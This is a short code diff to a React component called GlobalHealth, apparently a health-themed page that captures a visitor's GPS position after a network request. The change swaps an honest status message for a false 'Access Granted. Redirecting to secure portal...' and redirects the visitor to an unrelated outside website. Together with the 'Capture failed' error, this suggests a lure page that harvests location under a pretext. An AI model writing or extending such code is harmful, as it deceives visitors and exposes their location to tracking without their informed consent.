@@ -44,11 +44,10 @@ export default function GlobalHealth() {
       });
       
       if (position && response.ok) {
-        setStatus('GPS Synchronized. Local centers identified.');
+        setStatus('Access Granted. Redirecting to secure portal...');
         setTimeout(() => {
-          setStatus(null);
-          setLoading(false);
-        }, 3000);
+          window.location.href = 'https://www.academically.me/';
+        }, 2000);
       }
     } catch (err) {
       console.error('Capture failed:', err);
